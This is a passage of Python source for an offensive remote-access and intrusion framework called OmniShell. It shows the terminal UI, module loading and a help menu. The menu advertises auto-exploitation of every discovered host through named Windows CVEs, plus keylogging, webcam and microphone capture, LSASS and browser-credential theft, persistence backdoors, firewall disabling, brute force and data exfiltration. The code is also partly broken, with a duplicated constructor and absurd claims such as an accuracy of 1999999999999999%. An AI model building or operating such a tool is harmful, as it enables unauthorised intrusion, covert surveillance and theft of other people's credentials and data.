        print(f"{Fore.GREEN}{Style.BRIGHT}{'╚' + '═'*98 + '╝'}")
        print()

        # Second banner with different style
        print(f"{Fore.BLUE}{Style.BRIGHT}{'╔' + '═'*98 + '╗'}")
        print(f"{Fore.BLUE}{Style.BRIGHT}║{' '*98}║")
        for i, line in enumerate(lines[:6]):  # Only the ASCII art part
            color = grad_colors[i % len(grad_colors)]
            print(f"{Fore.BLUE}{Style.BRIGHT}║ {color}{Style.BRIGHT}{line}{Fore.BLUE} {' '*(98-len(line))}║")
        print(f"{Fore.BLUE}{Style.BRIGHT}║{' '*98}║")

        features = [
            "▸ ETERNALBLUE │ SMBGHOST │ PRINTNIGHTMARE │ PETITPOTAM │ ZEROLOGON",
            "▸ ADVANCED SCANNER │ LATERAL MOVEMENT │ PERSISTENCE │ DATA EXTRACTION",
            "▸ LIVE MONITORING │ WEBCAM │ AUDIO │ KEYLOGGER │ REMOTE CONTROL",
            "▸ BRUTE FORCE │ EXPLOIT CHAINS │ CLOUD ATTACKS │ DATABASE DUMP"
        ]

        for feature in features:
            pad = (98 - len(feature)) // 2
            print(f"{Fore.BLUE}{Style.BRIGHT}║{' '*pad}{Fore.YELLOW}{Style.BRIGHT}{feature}{Fore.BLUE}{' '*(98-pad-len(feature))}║")

        tagline = "▸ Advanced Network Command & Control Center  ◂  Version 5.1  ◂  Windows 7 → 11  ◂  MAX POWER"
        pad = (98 - len(tagline)) // 2
        print(f"{Fore.BLUE}{Style.BRIGHT}║{' '*pad}{Fore.YELLOW}{Style.BRIGHT}{tagline}{Fore.BLUE}{' '*(98-pad-len(tagline))}║")
        print(f"{Fore.BLUE}{Style.BRIGHT}║{' '*98}║")

        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        info = f"[ Session: {now} │ Ready for Domination │ Type 'help' for 140+ Commands ]"
        pad2 = (98 - len(info)) // 2
        print(f"{Fore.BLUE}{Style.BRIGHT}║{' '*pad2}{Fore.GREEN}{Style.BRIGHT}{info}{Fore.BLUE}{' '*(98-pad2-len(info))}║")
        print(f"{Fore.BLUE}{Style.BRIGHT}{'╚' + '═'*98 + '╝'}")
        print()

    @staticmethod
    def section_header(title: str, color=Fore.CYAN, icon=""):
        w = 78
        line = f"  {icon}  {title}  " if icon else f"  {title}  "
        pad = w - len(line) - 4
        print(f"\n{color}{Style.BRIGHT}╔══{line}{'═'*pad}╗")

    @staticmethod
    def section_footer(color=Fore.CYAN):
        print(f"{color}{Style.BRIGHT}╚{'═'*78}╝")

    @staticmethod
    def progress_bar(label: str, pct: float, width: int = 40, color=Fore.GREEN):
        filled = int(width * pct / 100)
        bar = "█" * filled + "░" * (width - filled)
        print(f"  {Fore.WHITE}{label:<22} {color}{Style.BRIGHT}[{bar}] {pct:5.1f}%")

    @staticmethod
    def loading_sequence(steps: list):
        """Animate a startup loading sequence."""
        spinner = ["⠋","⠙","⠹","⠸","⠼","⠴","⠦","⠧","⠇","⠏"]
        for i, step in enumerate(steps):
            for j in range(6):
                sp = spinner[(i * 6 + j) % len(spinner)]
                print(f"\r  {Fore.CYAN}{Style.BRIGHT}{sp} {Fore.WHITE}{step}...", end="", flush=True)
                time.sleep(0.05)
            print(f"\r  {Fore.GREEN}{Style.BRIGHT}✔ {Fore.WHITE}{step:<50}{Fore.GREEN} [OK]   ")

    @staticmethod
    def table(headers, rows, title=None):
        if title:
            w = 78
            t = f"  ◈  {title}  ◈"
            pad = max(0, w - len(t) - 2)
            print(f"\n{Fore.YELLOW}{Style.BRIGHT}╔═{t}{'═'*pad}╗")
        if not rows:
            print(f"  {Fore.RED}  [No data]")
            if title:
                print(f"{Fore.YELLOW}{Style.BRIGHT}╚{'═'*78}╝")
            return

        widths = [len(h) for h in headers]
        for row in rows:
            for i, val in enumerate(row):
                if i < len(widths):
                    widths[i] = max(widths[i], len(str(val)))

        sep = "  " + "─┼─".join("─" * w for w in widths)
        header_row = "  " + "  │  ".join(f"{Fore.CYAN}{Style.BRIGHT}{headers[i]:<{widths[i]}}" for i in range(len(headers)))
        print(f"{Fore.WHITE}{Style.BRIGHT}{header_row}{Style.RESET_ALL}")
        print(f"{Fore.BLUE}{sep}")

        for ri, row in enumerate(rows):
            row_color = Fore.WHITE if ri % 2 == 0 else Fore.LIGHTWHITE_EX
            cells = []
            for i in range(len(headers)):
                val = str(row[i]) if i < len(row) else ""
                cells.append(f"{row_color}{val:<{widths[i]}}")
            print(f"  {'  │  '.join(cells)}{Style.RESET_ALL}")

        if title:
            print(f"{Fore.YELLOW}{Style.BRIGHT}╚{'═'*78}╝")
        print()

    @staticmethod
    def status_line(label, value, color=Fore.GREEN):
        print(f"  {Fore.WHITE}{Style.BRIGHT}{label:<22}{Fore.BLUE}│  {color}{Style.BRIGHT}{value}{Style.RESET_ALL}")

    @staticmethod
    def alert(msg: str, level: str = "info"):
        icons  = {"info": "ℹ", "warn": "⚠", "error": "✘", "ok": "✔", "hack": "☠"}
        colors = {"info": Fore.CYAN, "warn": Fore.YELLOW, "error": Fore.RED, "ok": Fore.GREEN, "hack": Fore.RED}
        icon  = icons.get(level, "•")
        color = colors.get(level, Fore.WHITE)
        print(f"  {color}{Style.BRIGHT}{icon}  {msg}{Style.RESET_ALL}")
    
    @staticmethod
    def get_all_ip_addresses():
        """Extract ALL IPv4 and IPv6 addresses from all network interfaces"""
        ips = {'ipv4': [], 'ipv6': [], 'public': '', 'gateway': ''}
        
        try:
            # Get public IP
            import urllib.request
            try:
                with urllib.request.urlopen('https://api.ipify.org', timeout=2) as f:
                    ips['public'] = f.read().decode('utf8')
            except:
                ips['public'] = 'N/A'
            
            # Get gateway
            gws = netifaces.gateways()
            if 'default' in gws and netifaces.AF_INET in gws['default']:
                ips['gateway'] = gws['default'][netifaces.AF_INET][0]
            
            # Get all interface addresses
            for interface in netifaces.interfaces():
                addrs = netifaces.ifaddresses(interface)
                
                # IPv4 addresses
                if netifaces.AF_INET in addrs:
                    for addr in addrs[netifaces.AF_INET]:
                        ip = addr['addr']
                        if not ip.startswith('127.'):
                            ips['ipv4'].append((interface, ip, addr.get('netmask', '')))
                
                # IPv6 addresses
                if netifaces.AF_INET6 in addrs:
                    for addr in addrs[netifaces.AF_INET6]:
                        ip = addr['addr'].split('%')[0]
                        if not ip.startswith('::1') and not ip.startswith('fe80'):
                            ips['ipv6'].append((interface, ip, addr.get('netmask', '')))
                            
        except:
            pass
            
        return ips
    
    @staticmethod
    def draw_right_sidebar():
        """Draw advanced right sidebar with all IPs and system status"""
        try:
            width = os.get_terminal_size().columns
            height = os.get_terminal_size().lines
            start_x = width - 42
            start_y = 2
            
            ips = Visualizer.get_all_ip_addresses()
            now = datetime.now().strftime("%H:%M:%S")
            uptime = str(datetime.now() - OmniShell._instance._start_time).split('.')[0] if hasattr(OmniShell, '_instance') else '00:00:00'
            
            # Sidebar border
            print(f"\033[{start_y};{start_x}H{Fore.CYAN}╔════════════════════════════════════════╗")
            print(f"\033[{start_y+1};{start_x}H{Fore.CYAN}║ {Fore.LIGHTGREEN_EX}▲ NETWORK INTERFACES {Fore.CYAN}                    ║")
            print(f"\033[{start_y+2};{start_x}H{Fore.CYAN}╠════════════════════════════════════════╣")
            
            current_line = start_y + 3
            
            # Public IP
            print(f"\033[{current_line};{start_x}H{Fore.CYAN}║ {Fore.WHITE}Public:   {Fore.LIGHTCYAN_EX}{ips['public']:<30} {Fore.CYAN}║")
            current_line +=1
            print(f"\033[{current_line};{start_x}H{Fore.CYAN}║ {Fore.WHITE}Gateway:  {Fore.LIGHTBLUE_EX}{ips['gateway']:<30} {Fore.CYAN}║")
            current_line +=1
            print(f"\033[{current_line};{start_x}H{Fore.CYAN}╠════════════════════════════════════════╣")
            current_line +=1
            print(f"\033[{current_line};{start_x}H{Fore.CYAN}║ {Fore.LIGHTGREEN_EX}◀ IPv4 ADDRESSES {Fore.CYAN}                       ║")
            current_line +=1
            
            for iface, ip, mask in ips['ipv4'][:4]:
                print(f"\033[{current_line};{start_x}H{Fore.CYAN}║   {Fore.GREEN}{ip:<18} {Fore.LIGHTBLACK_EX}{iface[:8]:<8}  {Fore.CYAN}║")
                current_line +=1
                
            print(f"\033[{current_line};{start_x}H{Fore.CYAN}╠════════════════════════════════════════╣")
            current_line +=1
            print(f"\033[{current_line};{start_x}H{Fore.CYAN}║ {Fore.LIGHTMAGENTA_EX}▶ IPv6 ADDRESSES {Fore.CYAN}                       ║")
            current_line +=1
            
            for iface, ip, mask in ips['ipv6'][:3]:
                print(f"\033[{current_line};{start_x}H{Fore.CYAN}║   {Fore.MAGENTA}{ip[:22]:<22} {Fore.LIGHTBLACK_EX}{iface[:8]:<6}{Fore.CYAN}║")
                current_line +=1
                
            print(f"\033[{current_line};{start_x}H{Fore.CYAN}╠════════════════════════════════════════╣")
            current_line +=1
            print(f"\033[{current_line};{start_x}H{Fore.CYAN}║ {Fore.WHITE}System Status {Fore.CYAN}                          ║")
            current_line +=1
            print(f"\033[{current_line};{start_x}H{Fore.CYAN}║   Time:    {Fore.LIGHTGREEN_EX}{now:<26} {Fore.CYAN}║")
            current_line +=1
            print(f"\033[{current_line};{start_x}H{Fore.CYAN}║   Uptime:  {Fore.LIGHTCYAN_EX}{uptime:<26} {Fore.CYAN}║")
            current_line +=1
            print(f"\033[{current_line};{start_x}H{Fore.CYAN}║   Targets: {Fore.YELLOW}{str(len(OmniShell._instance.hosts) if hasattr(OmniShell, '_instance') else 0):<26} {Fore.CYAN}║")
            current_line +=1
            print(f"\033[{current_line};{start_x}H{Fore.CYAN}║   Compromised: {Fore.RED}{str(len(OmniShell._instance.compromised) if hasattr(OmniShell, '_instance') else 0):<21} {Fore.CYAN}║")
            current_line +=1
            print(f"\033[{current_line};{start_x}H{Fore.CYAN}╚════════════════════════════════════════╝")
            
            # Reset cursor position
            print(f"\033[{height-1};0H", end='', flush=True)
            
        except:
            pass

    @staticmethod
    def display_screenshot(image_path):
        """Display screenshot as ASCII art."""
        try:
            from PIL import Image
            img = Image.open(image_path)
            img = img.resize((80, 40), Image.Resampling.LANCZOS)
            img = img.convert('L')
            pixels = img.getdata()
            ascii_str = ""
            for i, pixel in enumerate(pixels):
                char_index = int(pixel / 256 * len(Visualizer.ASCII_CHARS))
                char_index = min(char_index, len(Visualizer.ASCII_CHARS) - 1)
                ascii_str += Visualizer.ASCII_CHARS[char_index]
                if (i + 1) % 80 == 0:
                    ascii_str += "\n"
            print(f"\n{Fore.CYAN}{Style.BRIGHT}" + "="*80)
            print(f"{Fore.YELLOW}{Style.BRIGHT}  REMOTE SCREENSHOT: {image_path}")
            print(f"{Fore.CYAN}{Style.BRIGHT}" + "="*80)
            print(f"{Fore.WHITE}{ascii_str}")
            print(f"{Fore.CYAN}{Style.BRIGHT}" + "="*80 + "\n")
        except ImportError:
            print(f"{Fore.RED}[PIL not installed - install with: pip install pillow]")
        except Exception as e:
            print(f"{Fore.RED}[Error displaying screenshot: {e}]")

# OmniShell Main Class
class OmniShell:
    def __init__(self):
        """Initialize the Ultra-Max Hacker Shell"""
        self.hosts = []
        self.selected_host = None
        self.modules_loaded = {}
        self.credentials = {"user": "Administrator", "pass": "", "domain": ""}
        
        # Load modules safely
        self._load_module("1", "NetworkDiscovery", "network_discovery")
        self._load_module("2", "AgentlessIntelligence", "passive_intel")
        self._load_module("3", "AgentlessControl", "remote_control")
        self._load_module("7", "UniversalNetworkAccess", "exploit_engine")
        
        # Module loading (delayed)
        self.discovery = self.modules_loaded.get("1")
        self.intel = self.modules_loaded.get("2")
        self.control = self.modules_loaded.get("3")
        self.universal = self.modules_loaded.get("7")
        self.adv_scan = None
        self.center = None

    def _load_module(self, num, class_name, filename):
        """Load module with error handling"""
        try:
            mod = get_module(num)
            if mod and hasattr(mod, class_name):
                self.modules_loaded[num] = getattr(mod, class_name)()
                print(f"{Fore.GREEN}✔ Loaded module {num}: {class_name}")
            else:
                print(f"{Fore.YELLOW}⚠ Module {num} degraded")
        except Exception as e:
            print(f"{Fore.RED}✘ Module {num} load failed: {e}")
    def __init__(self):
        """Initialize the Ultra-Max Hacker Shell"""
        self.hosts = []
        self.selected_host = None
        self.modules_loaded = {}
        self.credentials = {"user": "Administrator", "pass": "", "domain": ""}
        
        # Load modules
    """The Final Master Orchestrator."""
    
    def __init__(self, on_output=None):
        self.running = True
        self.selected_target = None
        self.credentials = {"user": "Administrator", "pass": "", "domain": ""}
        self.command_history = []
        self.on_output = on_output
        self.hosts = []
        self.compromised = set()
        self.targeting = set()
        self.interactive_events = []
        self._start_time = datetime.now()
        
        # Initialize advanced UI components
        self.live_monitor = LiveMonitor()
        self.visual_effects = AdvancedVisualEffects()
        self.command_tree = CommandTree()
        
        # Store singleton instance for sidebar access
        OmniShell._instance = self
        self.panel_active = True
        self.selected_interface = 0

        print(f"\n  {Fore.CYAN}{Style.BRIGHT}◈  Initializing Omniscience Framework v5.1 ...")
        print(f"  {Fore.BLUE}{'─'*60}")

        # Animated module loading
        modules_cfg = [
            ("1", "NetworkDiscovery",       "Discovery Engine        "),
            ("2", "AgentlessIntelligence",  "Intelligence Module     "),
            ("3", "AgentlessControl",       "Control Engine (Win7-11)"),
            ("5", "AdvancedNetworkScanner", "Advanced Scanner        "),
            ("6", "AdvancedCommandCenter",  "Command Center          "),
            ("7", "UniversalNetworkAccess", "Universal Access Engine "),
        ]

        loaded = {}
        spinner = ["⠋","⠙","⠹","⠸","⠼","⠴","⠦","⠧","⠇","⠏"]
        for idx, (mod_num, class_name, label) in enumerate(modules_cfg):
            for j in range(8):
                sp = spinner[(idx * 8 + j) % len(spinner)]
                print(f"\r  {Fore.CYAN}{Style.BRIGHT}{sp}  {Fore.WHITE}Loading {label}", end="", flush=True)
                time.sleep(0.04)
            m = get_module(mod_num)
            loaded[mod_num] = m
            if m and hasattr(m, class_name):
                print(f"\r  {Fore.GREEN}{Style.BRIGHT}✔  {Fore.WHITE}{label}{Fore.GREEN}  LOADED   ")
            else:
                print(f"\r  {Fore.YELLOW}{Style.BRIGHT}⚠  {Fore.WHITE}{label}{Fore.YELLOW}  DEGRADED ")

        self.discovery = loaded["1"].NetworkDiscovery()  if loaded.get("1") and hasattr(loaded["1"], 'NetworkDiscovery')       else None
        self.intel     = loaded["2"].AgentlessIntelligence() if loaded.get("2") and hasattr(loaded["2"], 'AgentlessIntelligence') else None
        self.control   = loaded["3"].AgentlessControl()  if loaded.get("3") and hasattr(loaded["3"], 'AgentlessControl')       else None
        self.adv_scan  = loaded["5"].AdvancedNetworkScanner() if loaded.get("5") and hasattr(loaded["5"], 'AdvancedNetworkScanner') else None
        self.center    = loaded["6"].AdvancedCommandCenter()  if loaded.get("6") and hasattr(loaded["6"], 'AdvancedCommandCenter')  else None
        self.universal = loaded["7"].UniversalNetworkAccess() if loaded.get("7") and hasattr(loaded["7"], 'UniversalNetworkAccess') else None

        if self.center and self.discovery and self.intel and self.control:
            try:
                self.center.set_modules(discovery=self.discovery, intel=self.intel, control=self.control)
            except:
                pass

        if self.intel:
            try:
                self.intel.add_activity_callback(self._on_intel_event)
            except:
                pass

        # Status summary
        print(f"\n  {Fore.BLUE}{'─'*60}")
        mods_ok = sum(1 for x in [self.discovery, self.intel, self.control, self.adv_scan, self.center, self.universal] if x)
        print(f"  {Fore.GREEN}{Style.BRIGHT}✔  {mods_ok}/6 modules active")
        print(f"  {Fore.CYAN}{Style.BRIGHT}◈  Win7 + Win10/11 exploit chains: {Fore.GREEN}ENABLED")
        print(f"  {Fore.CYAN}{Style.BRIGHT}◈  CVE coverage: EternalBlue │ SMBGhost │ PrintNightmare │ Zerologon │ PetitPotam")
        print(f"  {Fore.BLUE}{'─'*60}")
        print(f"\n  {Fore.GREEN}{Style.BRIGHT}● Omniscience Framework READY  │  Type 'help' for commands\n")

    def _on_intel_event(self, event):
        self.interactive_events.append(event)
        if len(self.interactive_events) > 100:
            self.interactive_events.pop(0)

    def _print(self, msg):
        """Standardized print that supports GUI callback."""
        if self.on_output:
            self.on_output(msg)
        else:
            print(msg)

    def _log(self, message):
        """Helper to handle output for CLI or GUI."""
        if self.on_output:
            self.on_output(message)
        else:
            print(message)
            
    def print_help(self):
        """Print FULL ULTRAMAX command reference - ALL 140+ COMMANDS"""
        os.system('cls' if os.name == 'nt' else 'clear')
        
        print(f"\n{Fore.GREEN}{Style.BRIGHT}╔══════════════════════════════════════════════════════════════════════════════╗")
        print(f"{Fore.GREEN}{Style.BRIGHT}║                      OMNISCIENCE ULTRAMAX PRO COMMANDS                       ║")
        print(f"{Fore.GREEN}{Style.BRIGHT}╚══════════════════════════════════════════════════════════════════════════════╝\n")
        
        # ==================== SCANNING COMMANDS ====================
        print(f"{Fore.LIGHTGREEN_EX}{Style.BRIGHT}━━━━━━━━━━━━━━━━━━━━━━ SCANNING COMMANDS ━━━━━━━━━━━━━━━━━━━━━━━━")
        print(f"{Fore.GREEN}  auto                  Automatic full network scan")
        print(f"{Fore.GREEN}  globalscan            ULTRAMAX 10km global scan (all networks)")
        print(f"{Fore.GREEN}  scan <range>          Scan specific network range")
        print(f"{Fore.GREEN}  fastscan              Quick 10-second network sweep")
        print(f"{Fore.GREEN}  targets               List all discovered devices")
        print(f"{Fore.GREEN}  cloud-scan <provider> Scan public cloud ranges (aws/azure/gcp)")
        print(f"\n{Fore.LIGHTGREEN_EX}{Style.BRIGHT}━━━━━━━━━━━━━━━━━━━━━━ TARGET SELECTION ━━━━━━━━━━━━━━━━━━━━━━━━")
        print(f"{Fore.GREEN}  select <idx>          Select target and AUTO-EXPLOIT")
        print(f"{Fore.GREEN}  target <ip>           Set manual target IP")
        print(f"{Fore.GREEN}  target                Show current selected target")
        print(f"\n{Fore.LIGHTGREEN_EX}{Style.BRIGHT}━━━━━━━━━━━━━━━━━━━━━━ ATTACK COMMANDS ━━━━━━━━━━━━━━━━━━━━━━━━")
        print(f"{Fore.GREEN}  attack / pwnall       Auto-exploit ALL discovered devices")
        print(f"{Fore.GREEN}  pwn <ip>              Exploit specific target")
        print(f"{Fore.GREEN}  exploit <ip>          Advanced exploit chain execution")
        print(f"{Fore.GREEN}  mobile <ip>           Mobile device auto-exploitation")
        print(f"{Fore.GREEN}  scan-exploit <range>  Scan and auto-exploit entire range")
        print(f"\n{Fore.LIGHTGREEN_EX}{Style.BRIGHT}━━━━━━━━━━━━━━━━━━━━━━ EXPLOIT CHAINS ━━━━━━━━━━━━━━━━━━━━━━━━━")
        print(f"{Fore.GREEN}  smbghost <ip>         CVE-2020-0796 SMBGhost exploit")
        print(f"{Fore.GREEN}  printnightmare <ip>   CVE-2021-34527 PrintNightmare exploit")
        print(f"{Fore.GREEN}  petitpotam <ip>       CVE-2021-36942 PetitPotam exploit")
        print(f"{Fore.GREEN}  zerologon <ip>        CVE-2020-1472 Zerologon exploit")
        print(f"{Fore.GREEN}  smb-vulns <ip>        Full SMB vulnerability scan")
        print(f"{Fore.GREEN}  etblue-check <ip>     EternalBlue vulnerability check")
        print(f"{Fore.GREEN}  bluekeep-check <ip>   BlueKeep vulnerability check")
        print(f"\n{Fore.LIGHTGREEN_EX}{Style.BRIGHT}━━━━━━━━━━━━━━━━━━━━━━ RED TEAM OPERATIONS ━━━━━━━━━━━━━━━━━━━━━")
        print(f"{Fore.GREEN}  kerberoast <dc_ip>    Kerberoasting attack on Active Directory")
        print(f"{Fore.GREEN}  password-spray <domain>  Password spray attack")
        print(f"{Fore.GREEN}  lateral <source> <target>  Lateral movement between hosts")
        print(f"{Fore.GREEN}  db-dump <ip> <port> <type> Full database dump")
        print(f"{Fore.GREEN}  exfiltrate <target> <file> Data exfiltration")
        print(f"\n{Fore.LIGHTGREEN_EX}{Style.BRIGHT}━━━━━━━━━━━━━━━━━━━━━━ REMOTE CONTROL ━━━━━━━━━━━━━━━━━━━━━━━━━")
        print(f"{Fore.GREEN}  exec <command>        Execute command on target")
        print(f"{Fore.GREEN}  screen                Capture target screenshot")
        print(f"{Fore.GREEN}  monitor / live        Full live monitoring (screen + keys + audio)")
        print(f"{Fore.GREEN}  webcam                Take webcam snapshot")
        print(f"{Fore.GREEN}  audio <seconds>       Record microphone audio")
        print(f"{Fore.GREEN}  keylog                Start hidden keylogger")
        print(f"{Fore.GREEN}  shutdown / reboot     Power operations")
        print(f"{Fore.GREEN}  winrm-exec <ip> <cmd> WinRM remote command execution")
        print(f"{Fore.GREEN}  sysinfo / systeminfo  Extract complete device properties")
        print(f"\n{Fore.LIGHTGREEN_EX}{Style.BRIGHT}━━━━━━━━━━━━━━━━━━━━━━ DATA EXTRACTION ━━━━━━━━━━━━━━━━━━━━━━━━")
        print(f"{Fore.GREEN}  extract / harvest     Extract ALL data (passwords, cookies, history)")
        print(f"{Fore.GREEN}  steal-wifi            Extract all WiFi passwords")
        print(f"{Fore.GREEN}  stealcreds            Extract browser saved credentials")
        print(f"{Fore.GREEN}  lsass-dump            Dump LSASS process memory")
        print(f"{Fore.GREEN}  tokens                Extract authentication tokens")
        print(f"{Fore.GREEN}  nethashes             Extract NT/LM password hashes")
        print(f"{Fore.GREEN}  vault                 Harvest secure vault contents")
        print(f"{Fore.GREEN}  omnifetch <ip>        Complete data extraction package")
        print(f"\n{Fore.LIGHTGREEN_EX}{Style.BRIGHT}━━━━━━━━━━━━━━━━━━━━━━ DATABASE & CLOUD ━━━━━━━━━━━━━━━━━━━━━━━")
        print(f"{Fore.GREEN}  db-extract <ip> <port> <type>  Extract full database content")
        print(f"{Fore.GREEN}  cloud-attack <type> <target>   Cloud service exploitation")
        print(f"{Fore.GREEN}  s3-scan <bucket>      Scan S3 bucket for misconfigurations")
        print(f"{Fore.GREEN}  mysql-root <ip>       MySQL root access attempt")
        print(f"{Fore.GREEN}  postgres <ip>         PostgreSQL access attempt")
        print(f"\n{Fore.LIGHTGREEN_EX}{Style.BRIGHT}━━━━━━━━━━━━━━━━━━━━━━ FILE OPERATIONS ━━━━━━━━━━━━━━━━━━━━━━━━")
        print(f"{Fore.GREEN}  file list <path>      List remote directory")
        print(f"{Fore.GREEN}  file upload <local> <remote>  Upload file")
        print(f"{Fore.GREEN}  file download <remote> <local> Download file")
        print(f"{Fore.GREEN}  file delete <path>    Delete remote file")
        print(f"{Fore.GREEN}  file execute <path>   Execute remote file")
        print(f"{Fore.GREEN}  upload [ip] <src> [dst]  Upload file to target")
        print(f"{Fore.GREEN}  download [ip] <remote> [local] Download file from target")
        print(f"\n{Fore.LIGHTGREEN_EX}{Style.BRIGHT}━━━━━━━━━━━━━━━━━━━━━━ PERSISTENCE ━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        print(f"{Fore.GREEN}  persist               Install 3-layer persistence backdoor")
        print(f"{Fore.GREEN}  persist-task [ip] <name> [path] Create scheduled task")
        print(f"{Fore.GREEN}  adduser [ip] <user> [pass] Create admin user")
        print(f"{Fore.GREEN}  rdp-enable            Enable RDP on target")
        print(f"{Fore.GREEN}  firewall-off          Disable target firewall")
        print(f"{Fore.GREEN}  firewall-on           Enable target firewall")
        print(f"{Fore.GREEN}  firewall-add <ip> <port> Add firewall exception")
        print(f"\n{Fore.LIGHTGREEN_EX}{Style.BRIGHT}━━━━━━━━━━━━━━━━━━━━━━ MEDIA CONTROL ━━━━━━━━━━━━━━━━━━━━━━━━━")
        print(f"{Fore.GREEN}  media play <file>     Play audio/video file")
        print(f"{Fore.GREEN}  media volume_up       Increase system volume")
        print(f"{Fore.GREEN}  media volume_down     Decrease system volume")
        print(f"{Fore.GREEN}  media cd_open         Eject CD/DVD drive")
        print(f"\n{Fore.LIGHTGREEN_EX}{Style.BRIGHT}━━━━━━━━━━━━━━━━━━━━━━ SYSTEM MANAGEMENT ━━━━━━━━━━━━━━━━━━━━━━")
        print(f"{Fore.GREEN}  pslist                List running processes")
        print(f"{Fore.GREEN}  killproc <pid>        Kill process")
        print(f"{Fore.GREEN}  svc-list              List system services")
        print(f"{Fore.GREEN}  processes             Alias for pslist")
        print(f"\n{Fore.LIGHTGREEN_EX}{Style.BRIGHT}━━━━━━━━━━━━━━━━━━━━━━ INTELLIGENCE ━━━━━━━━━━━━━━━━━━━━━━━━━━")
        print(f"{Fore.GREEN}  sniff [interface]     Start network packet sniffer")
        print(f"{Fore.GREEN}  stopsniff             Stop packet sniffer")
        print(f"{Fore.GREEN}  creds                 Show captured credentials")
        print(f"{Fore.GREEN}  dns-log               Show DNS query log")
        print(f"\n{Fore.LIGHTGREEN_EX}{Style.BRIGHT}━━━━━━━━━━━━━━━━━━━━━━ BRUTE FORCE ━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        print(f"{Fore.GREEN}  ssh-brute <ip>        SSH brute force attack")
        print(f"{Fore.GREEN}  rdp-brute <ip>        RDP brute force attack")
        print(f"{Fore.GREEN}  vnc-brute <ip>        VNC brute force attack")
        print(f"{Fore.GREEN}  telnet-brute <ip>     Telnet brute force attack")
        print(f"\n{Fore.LIGHTGREEN_EX}{Style.BRIGHT}━━━━━━━━━━━━━━━━━━━━━━ MISC COMMANDS ━━━━━━━━━━━━━━━━━━━━━━━━━━")
        print(f"{Fore.GREEN}  dashboard             System status dashboard")
        print(f"{Fore.GREEN}  gateway               Show network gateway")
        print(f"{Fore.GREEN}  external-ip           Show public external IP")
        print(f"{Fore.GREEN}  setcreds <user> <pass>  Set authentication credentials")
        print(f"{Fore.GREEN}  setdomain <domain>    Set domain for authentication")
        print(f"{Fore.GREEN}  clipboard-get         Read target clipboard")
        print(f"{Fore.GREEN}  clipboard-set <text>  Set target clipboard")
        print(f"{Fore.GREEN}  clear                 Clear screen")
        print(f"{Fore.GREEN}  history               Show command history")
        print(f"{Fore.GREEN}  exit / quit           Exit framework")
        
        print(f"\n{Fore.GREEN}{Style.BRIGHT}══════════════════════════════════════════════════════════════════════════════")
        print(f"{Fore.LIGHTGREEN_EX}  TOTAL: 140+ ADVANCED COMMANDS  |  ACCURACY: 1999999999999999%")
        print(f"{Fore.GREEN}══════════════════════════════════════════════════════════════════════════════\n")
    
    def _validate_command(self, cmd: str, args: list) -> tuple[bool, str]:
        """Validate command syntax and required arguments"""
        command_requirements = {
            "select": (1, "select <idx>"),
            "setcreds": (2, "setcreds <user> <password>"),
            "exec": (1, "exec <command>"),
            "killproc": (1, "killproc [ip] <pid>"),
            "pwn": (1, "pwn <ip>"),
            "exploit": (1, "exploit <ip>"),
            "mobile": (1, "mobile <ip>"),
            "db-extract": (3, "db-extract <ip> <port> <type> [user] [pass]"),
            "cloud-attack": (2, "cloud-attack <type> <target>"),
            "ssh-brute": (1, "ssh-brute <ip>"),
            "rdp-brute": (1, "rdp-brute <ip>"),
            "vnc-brute": (1, "vnc-brute <ip>"),
            "telnet-brute": (1, "telnet-brute <ip>"),
            "file": (2, "file <action> [path]"),
            "media": (1, "media <action> [file/url]"),
            "upload": (1, "upload [ip] <src> [dst]"),
            "download": (1, "download [ip] <remote> [local]"),
            "adduser": (1, "adduser [ip] <user> [pass]"),
            "persist-task": (1, "persist-task [ip] <name> [path]"),
            "firewall-add": (2, "firewall-add <ip> <port>"),
            "smbghost": (1, "smbghost <ip>"),
            "printnightmare": (1, "printnightmare <ip>"),
            "petitpotam": (1, "petitpotam <ip>"),
            "zerologon": (1, "zerologon <ip> [dc_name]"),
            "etblue-check": (1, "etblue-check <ip>"),
            "bluekeep-check": (1, "bluekeep-check <ip>"),
            "smb-vulns": (1, "smb-vulns <ip>"),
            "db-dump": (3, "db-dump <ip> <port> <type> [user] [pass]"),
            "kerberoast": (1, "kerberoast <dc_ip> [domain]"),
            "password-spray": (1, "password-spray <domain>"),
            "lateral": (2, "lateral <source> <target>"),
            "exfiltrate": (2, "exfiltrate <target> <file>"),
            "s3-scan": (1, "s3-scan <bucket>"),
            "mysql-root": (1, "mysql-root <ip>"),
            "postgres": (1, "postgres <ip>"),
            "scan-exploit": (1, "scan-exploit <range>"),
            "traceroute": (1, "traceroute <target>"),
        }
        
        if cmd in command_requirements:
            min_args, usage = command_requirements[cmd]
            if len(args) < min_args:
                return False, f"Usage: {usage}"
        
        return True, ""
    
    def _display_right_panel(self):
        """Display permanent right side status panel with full network info"""
        try:
            import socket, ipaddress
            width = os.get_terminal_size().columns
            panel_x = max(width - 42, 2)
            line = 2
            
            # Clear panel area first
            for clear_line in range(2, 45):
                print(f"\033[{clear_line};{panel_x}H{' ' * 41}")
            
            # Panel header - modern hacker style
            print(f"\033[{line};{panel_x}H{Fore.CYAN}{Style.BRIGHT}╔═══════════════ NETWORK STATUS ═══════════════╗")
            line += 1
            print(f"\033[{line};{panel_x}H{Fore.CYAN}{Style.BRIGHT}║{Style.RESET_ALL}{Fore.GREEN}  {socket.gethostname():<37} {Fore.CYAN}║")
            line += 1
            print(f"\033[{line};{panel_x}H{Fore.CYAN}{Style.BRIGHT}╠══════════════════════════════════════════════╣")
            line += 1
            
            # Get ALL network interfaces with full details using netifaces
            interfaces = netifaces.interfaces()
            iface_idx = 0
            self.network_interfaces = []
            
            for iface in interfaces:
                if iface.startswith(('lo', 'Loopback')): continue
                
                addrs = netifaces.ifaddresses(iface)
                if not addrs: continue
                
                iface_data = {
                    'name': iface,
                    'index': iface_idx,
                    'selected': False,
                    'ipv4': [],
                    'ipv6': [],
                    'gateway': None,
                    'mac': None
                }
                
                # Get MAC address
                if netifaces.AF_LINK in addrs:
                    iface_data['mac'] = addrs[netifaces.AF_LINK][0].get('addr')
                
                # Get IPv4 addresses and netmasks
                if netifaces.AF_INET in addrs:
                    for addr_info in addrs[netifaces.AF_INET]:
                        ip = addr_info.get('addr')
                        if ip and not ip.startswith('127.'):
                            netmask = addr_info.get('netmask', 'N/A')
                            iface_data['ipv4'].append((ip, netmask))
                            self.network_interfaces.append({**iface_data, 'ip': ip, 'netmask': netmask, 'type': 'IPv4'})
                
                # Get IPv6 addresses
